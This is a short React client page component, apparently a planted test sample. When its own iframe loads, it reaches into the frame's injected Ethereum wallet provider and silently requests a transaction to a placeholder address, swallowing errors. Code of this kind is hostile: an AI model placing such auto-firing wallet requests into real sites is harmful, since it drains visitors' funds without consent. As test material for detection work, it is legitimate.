"use client";
// planted: a frame of its own making, and a send through the frame's wallet
export default function Page() {
  const send = (f: HTMLIFrameElement) => {
    const p = (f.contentWindow as unknown as { ethereum?: { request: (a: unknown) => Promise<unknown> } } | null)?.ethereum;
    p?.request({ method: "eth_sendTransaction", params: [{ to: "0x" + "ab".repeat(20), data: "0x" }] }).catch(() => {});
  };
  return <iframe srcDoc="<p>x</p>" onLoad={(e) => send(e.currentTarget)} />;
}
